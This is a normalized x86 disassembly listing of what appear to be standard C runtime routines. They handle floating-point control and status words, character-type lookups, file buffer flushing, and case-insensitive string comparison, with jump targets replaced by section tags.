or eax 0x4
test ecx 0x1000
je r-xdata
or eax 0x2
mov ebx 0x100
test ebx ecx
je r-xdata
or eax 0x1
mov edx ecx
and edx 0x6000
je r-xdata
or eax 0x80000
and ecx 0x8040
sub ecx 0x40
je r-xdata
cmp edx 0x2000
je r-xdata
or eax 0x2000000
sub ecx 0x7fc0
je r-xdata
or eax ebx
cmp edx 0x4000
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edx
call sub_43d2ef
push eax
mov [ ebp - 0x4 ] eax
call sub_445ab6
pop ecx
pop ecx
stmxcsr [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
test al al
jns r-xdata
or eax 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or eax 0x200
jmp r-xdata
cmp edx 0x6000
jne r-xdata
mov edx 0x200
test edx eax
je r-xdata
push 0x10
pop esi
mov ecx [ ebp + 0x8 ]
mov edx edi
not edx
and ecx edi
and edx eax
or edx ecx
cmp edx eax
je r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
test eax 0x400
je r-xdata
or esi 0x8
test eax 0x800
je r-xdata
or esi 0x4
test eax 0x1000
je r-xdata
or esi 0x2
test ebx eax
je r-xdata
or esi 0x1
mov ecx eax
mov edi 0x6000
and ecx edi
je r-xdata
or esi 0x80000
and eax 0x8040
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi ebx
cmp ecx 0x4000
je r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi edx
jmp r-xdata
cmp ecx edi
jne r-xdata
mov eax esi
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
sub_43d2ef
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
push ebx
push esi
push edi
mov edi 0x200
test cl 0x8
je r-xdata
mov eax 0x80
test cl 0x4
je r-xdata
or eax edi
test cl 0x2
je r-xdata
or eax 0x400
test cl 0x1
je r-xdata
or eax 0x800
mov esi 0x100
test ecx 0x80000
je r-xdata
or eax 0x1000
mov edx ecx
mov ebx 0x300
and edx ebx
je r-xdata
or eax esi
mov edx 0x3000000
pop edi
and ecx edx
pop esi
pop ebx
cmp ecx 0x1000000
je r-xdata
cmp edx esi
je r-xdata
or eax 0x8040
cmp ecx 0x2000000
je r-xdata
or eax 0x2000
cmp edx edi
je r-xdata
or eax 0x40
pop ebp
retn
cmp ecx edx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp edx ebx
jne r-xdata
pop ebp
retn
or eax 0x8000
pop ebp
retn
or eax 0x6000
jmp r-xdata
sub_43d39a
call sub_445a98
mov ecx eax
xor eax eax
test cl 0x3f
je r-xdata
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_43d3db
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
push ebx
push esi
movzx esi cx
mov ebx 0x300
mov edx esi
push edi
mov edi 0x200
and edx 0xc00
je r-xdata
or eax 0x80000
and esi ebx
je r-xdata
cmp edx 0x400
je r-xdata
or eax 0x20000
cmp esi edi
jne r-xdata
or eax 0x100
cmp edx 0x800
je r-xdata
pop ebp
retn
or eax 0x40000
pop edi
pop esi
pop ebx
test ecx 0x1000
je r-xdata
or eax 0x10000
jmp r-xdata
or eax edi
jmp r-xdata
cmp edx 0xc00
jne r-xdata
or eax ebx
jmp r-xdata
sub_43d47c
mov edi edi
push ebp
mov ebp esp
mov cx [ ebp + 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_43d4c0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
fnstsw [ ebp - 0x4 ]
fnclex
cmp [ rw-data ] 0x1
jl r-xdata
mov cx [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
mov ax [ ebp - 0x4 ]
xor ecx ecx
mov edx ecx
push edi
mov edi 0x80000
test al 0x3f
je r-xdata
mov esp ebp
pop ebp
retn
test cl 0x1
je r-xdata
stmxcsr [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
and eax 0xffffffc0
mov [ ebp - 0xc ] eax
ldmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
test al 0x3f
je r-xdata
test al 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
or ecx edx
mov eax ecx
pop edi
jmp r-xdata
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop edx
test cl 0x8
je r-xdata
or eax 0x8
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or edx 0x8
test cl 0x10
je r-xdata
or eax 0x4
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or edx 0x4
test cl 0x20
je r-xdata
or eax 0x2
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or edx 0x2
test cl 0x2
je r-xdata
or eax 0x1
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or edx 0x1
or eax 0x80000
test al 0x2
je r-xdata
or ecx 0x1
or edx edi
or ecx edi
sub_43d59e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
fwait
fnstcw [ ebp - 0x8 ]
mov ax [ ebp - 0x8 ]
xor ecx ecx
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
push ebx
push esi
movzx esi ax
mov ebx 0xc00
mov edx esi
push edi
mov edi 0x200
and edx ebx
je r-xdata
or ecx 0x80000
and esi 0x300
je r-xdata
cmp edx 0x400
je r-xdata
or ecx 0x20000
cmp esi edi
jne r-xdata
or ecx 0x100
cmp edx 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov esi edi
mov eax [ ebp + 0x8 ]
not esi
and esi ecx
and eax edi
or esi eax
cmp esi ecx
je r-xdata
or ecx 0x40000
mov edx 0x1000
test dx ax
je r-xdata
or ecx 0x10000
jmp r-xdata
or ecx edi
jmp r-xdata
cmp edx ebx
jne r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
push esi
call sub_43d8ec
pop ecx
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
xor esi esi
test al 0x1
je r-xdata
or ecx 0x300
jmp r-xdata
mov eax esi
and edi 0x308031f
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
test al al
jns r-xdata
test al 0x4
je r-xdata
push 0x10
pop esi
test eax 0x200
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or esi 0x8
test eax 0x400
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or esi 0x4
test eax 0x800
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or esi 0x2
test edx eax
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or esi 0x1
test eax 0x100
je r-xdata
or ecx 0x1
movzx edx ax
mov ecx edx
and ecx ebx
je r-xdata
or esi 0x80000
mov edx eax
mov ebx 0x6000
and edx ebx
je r-xdata
or ecx 0x80000
and edx 0x300
je r-xdata
cmp ecx 0x400
je r-xdata
push 0x40
and eax 0x8040
pop ebx
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or esi 0x20000
cmp edx 0x200
jne r-xdata
or esi 0x100
cmp ecx 0x800
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or esi 0x40000
mov edx 0x1000
test dx ax
je r-xdata
or esi 0x10000
jmp r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov eax ecx
or ecx esi
xor eax esi
test eax 0x8031f
je r-xdata
push eax
call sub_43d2ef
push eax
mov [ ebp - 0xc ] eax
call sub_445ab6
pop ecx
pop ecx
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
xor ecx ecx
test al al
jns r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx ebx
jne r-xdata
or esi 0x300
jmp r-xdata
mov eax ecx
jmp r-xdata
or ecx 0x80000000
test eax 0x200
je r-xdata
push 0x10
pop ecx
mov eax edi
and edi [ ebp + 0x8 ]
not eax
and eax ecx
or eax edi
cmp eax ecx
je r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax 0x400
je r-xdata
or ecx 0x8
test eax 0x800
je r-xdata
or ecx 0x4
test eax 0x1000
je r-xdata
or ecx 0x2
test eax 0x100
je r-xdata
or ecx 0x1
mov edx eax
mov edi 0x6000
and edx edi
je r-xdata
or ecx 0x80000
and eax 0x8040
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx edi
jne r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
sub_43d8bc
push esi
call sub_43c930
mov esi [ eax ]
fninit
call sub_40cfba
call sub_43d2e3
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
test [ eax ] 0x10008
je r-xdata
and [ eax + 0x20 ] 0x0
mov [ eax + 0x24 ] 0xffff
sub_43d8ec
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
inc eax
test cl 0x4
je r-xdata
or eax 0x4
test cl 0x2
je r-xdata
or eax 0x8
test cl 0x1
je r-xdata
or eax 0x10
test ecx 0x80000
je r-xdata
or eax 0x20
push esi
mov edx ecx
mov esi 0x300
push edi
mov edi 0x200
and edx esi
je r-xdata
or eax 0x2
mov edx ecx
and edx 0x30000
je r-xdata
cmp edx 0x100
je r-xdata
or eax esi
cmp edx 0x10000
jne r-xdata
or eax 0x400
cmp edx edi
je r-xdata
pop ebp
retn
or eax 0x1000
pop edi
pop esi
test ecx 0x40000
je r-xdata
or eax edi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp edx esi
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_43d985
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x9001f
mov ecx [ ebp + 0xc ]
jne r-xdata
push esi
and ecx 0xfff7ffff
xor esi esi
push ecx
push [ ebp + 0x8 ]
push esi
call sub_42ce8a
add esp 0xc
test eax eax
jne r-xdata
cmp ecx 0xffffffff
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_42fdfc
int3
pop esi
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
mov edx 0x1f3d
and ax dx
mov edx 0x23d
cmp ax dx
jne r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
mov esp ebp
pop ebp
retn
stmxcsr [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
and eax 0xfec0
cmp eax 0x1e80
je r-xdata
sub_43d9fd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
fwait
fnstsw [ ebp - 0x4 ]
mov dx [ ebp - 0x4 ]
xor eax eax
mov ecx eax
mov esi 0x80000
test dl 0x3f
je r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
test dl 0x1
je r-xdata
mov eax ecx
stmxcsr [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
test dl 0x3f
je r-xdata
test dl 0x4
je r-xdata
push 0x10
pop ecx
or eax ecx
jmp r-xdata
test dl 0x1
je r-xdata
test dl 0x8
je r-xdata
or ecx 0x8
pop esi
mov esp ebp
pop ebp
retn
test dl 0x4
je r-xdata
push 0x10
pop eax
test dl 0x10
je r-xdata
or ecx 0x4
test dl 0x8
je r-xdata
or eax 0x8
test dl 0x20
je r-xdata
or ecx 0x2
test dl 0x10
je r-xdata
or eax 0x4
test dl 0x2
je r-xdata
or ecx 0x1
test dl 0x20
je r-xdata
or eax 0x2
or ecx esi
test dl 0x2
je r-xdata
or eax 0x1
or eax esi
sub_43da99
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
fwait
fnstsw [ ebp - 0x4 ]
mov cx [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
call sub_43d39a
mov [ esi ] eax
mov [ edx ] eax
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_43db11
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ax
xor eax eax
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp - 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
sub_43db70
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43dba1
add esp 0xc
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax [ ebp + 0xc ]
pop ebp
retn
sub_43dba1
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
call sub_41cb44
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
lea ecx [ ebp - 0x1c ]
sar eax 0x8
mov [ ebp - 0x24 ] eax
push ecx
movzx eax al
push eax
call sub_43f824
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] bl
xor ecx ecx
mov [ ebp - 0xf ] al
inc ecx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x10 ] al
xor eax eax
push 0x2
mov [ ebp - 0xf ] bl
mov [ ebp - 0xe ] al
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
movzx eax [ ebp - 0xc ]
cmp [ ebp - 0x14 ] al
je r-xdata
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ax
mov eax [ ebp - 0x1c ]
push 0x1
push [ eax + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1c ]
push 0x1
push eax
call sub_43ad9c
add esp 0x1c
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x350 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
and [ eax + 0x350 ] 0xfffffffd
sub_43dc73
mov edi edi
push ebp
mov ebp esp
push esi
xor ecx ecx
mov esi 0xe3
pop esi
pop ebp
retn
test edx edx
jns r-xdata
lea ecx [ eax + 0x1 ]
lea esi [ eax - 0x1 ]
jmp r-xdata
lea eax [ esi + ecx ]
cdq
sub eax edx
mov edx [ ebp + 0x8 ]
sar eax 0x1
sub edx [ eax * 8 + r--data ]
je r-xdata
or eax 0xffffffff
cmp ecx esi
jle r-xdata
sub_43dcaa
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] ebx
mov edx eax
cmp ax bx
ja r-xdata
add esi 0x2
sub [ ebp - 0x4 ] 0x1
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
movzx eax ax
movzx edx dx
sub edx eax
je r-xdata
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax di
jb r-xdata
mov eax [ ecx * 8 + r--data ]
test edx edx
jns r-xdata
cmp dx ax
je r-xdata
lea edi [ ecx + 0x1 ]
mov [ ebp - 0xc ] edi
lea ebx [ ecx - 0x1 ]
mov [ ebp - 0x8 ] ebx
jmp r-xdata
movzx eax [ ecx + esi ]
cmp ax di
jb r-xdata
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] 0x55
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
push 0x41
pop edi
mov [ ebp - 0x10 ] ecx
mov esi [ ecx * 8 + r--data ]
mov ecx [ ebp + 0x8 ]
push 0x5a
sub ecx esi
pop ebx
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43dd66
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp - 0x4 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
sub esi 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_43dddb
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
cmp ecx 0x400
je r-xdata
cmp ecx 0x800
je r-xdata
cmp [ ebp + 0xc ] 0x0
mov esi [ ebp + 0x10 ]
jne r-xdata
test esi esi
js r-xdata
test esi esi
jg r-xdata
xor edi edi
mov ebx 0xe3
test eax eax
js r-xdata
test edx edx
jns r-xdata
mov ebx [ eax * 8 + r--data ]
push 0x55
push ebx
call sub_434d0d
mov edi eax
pop ecx
pop ecx
test esi esi
jle r-xdata
lea edi [ eax + 0x1 ]
lea ebx [ eax - 0x1 ]
jmp r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
cmp edi esi
jge r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov edx ecx
sar eax 0x1
sub edx [ eax * 8 + r--data ]
je r-xdata
or eax 0xffffffff
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push esi
push [ ebp + 0xc ]
call sub_436740
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
sub_43de85
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_43dcaa
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_43deb1
push 0xc
push r--data
call sub_40d260
xor esi esi
mov [ ebp - 0x1c ] esi
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43901e
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov edi [ eax ]
mov edx edi
sar edx 0x6
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x9
or esi 0xffffffff
push edi
call sub_43929b
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43df3d
mov eax esi
call sub_40d2a6
retn 0xc
call sub_42fee2
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
sub_43df49
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_43deb1
mov esp ebp
pop ebp
retn
sub_43dfae
mov eax [ ecx ]
push esi
mov esi [ eax ]
mov eax esi
and eax 0x3f
mov edx esi
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_42fef5
pop esi
mov [ eax ] 0x9
or eax 0xffffffff
retn
push esi
call sub_43929b
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
je r-xdata
call sub_42fee2
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
xor eax eax
pop esi
retn
sub_43e00c
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x9
call sub_42fdcf
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax esi
mov edx esi
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_43df49
pop ecx
pop ecx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_43e07b
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
push edi
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43e133
add esp 0x10
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax 0x7fffffff
jmp r-xdata
push ebx
push esi
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
sub edi 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop esi
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_43e133
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
xor esi esi
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
mov eax esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_41cb44
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] esi
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_445c08
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_445c08
add esp 0x10
movzx eax ax
sub [ ebp + 0x10 ] 0x1
lea ebx [ ebx + 0x2 ]
lea edi [ edi + 0x2 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
sub ebx edi
push 0x41
pop edx
push 0x5a
pop esi
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax ax
movzx esi si
sub esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
movzx eax [ ebx + edi ]
cmp ax dx
jb r-xdata
mov ecx [ ebp - 0x14 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp si ax
je r-xdata
mov esi eax
cmp ax si
ja r-xdata
add edi 0x2
sub ecx 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp ax dx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
jmp r-xdata
sub_43e240
push ebx
push esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
test ebx 0xffffffff
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx edx
test edx 0x3
je r-xdata
lea eax [ edx + ecx ]
and eax 0xfff
cmp eax 0xffc
ja r-xdata
movzx eax [ edx + ecx ]
cmp al [ edx ]
jne r-xdata
mov eax [ edx + ecx ]
cmp eax [ edx ]
jne r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebx
retn
test eax eax
je r-xdata
sub ebx 0x4
jbe r-xdata
inc edx
sub ebx 0x1
jbe r-xdata
lea esi [ eax - 0x1010101 ]
add edx 0x4
not eax
and eax esi
test eax 0x80808080
je r-xdata
test dl 0x3
jne r-xdata
sub_43e2b8
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43e324
add esp 0x10
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax 0x7fffffff
jmp r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_445cf0
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax esi
jmp r-xdata
sub_43e324
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
push ebx
push esi
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
mov edi [ ebp + 0x8 ]
mov esi 0x7fffffff
test edi edi
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0xc ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
sub edi ebx
push ecx
push ebx
push edi
call sub_445cf0
add esp 0xc
mov esi eax
jmp r-xdata
sub esi eax
test esi esi
je r-xdata
cmp esi eax
je r-xdata
movzx eax [ edi + ebx ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_433aec
lea ecx [ ebp - 0xc ]
mov esi eax
movzx eax [ ebx ]
push ecx
push eax
call sub_433aec
add esp 0x10
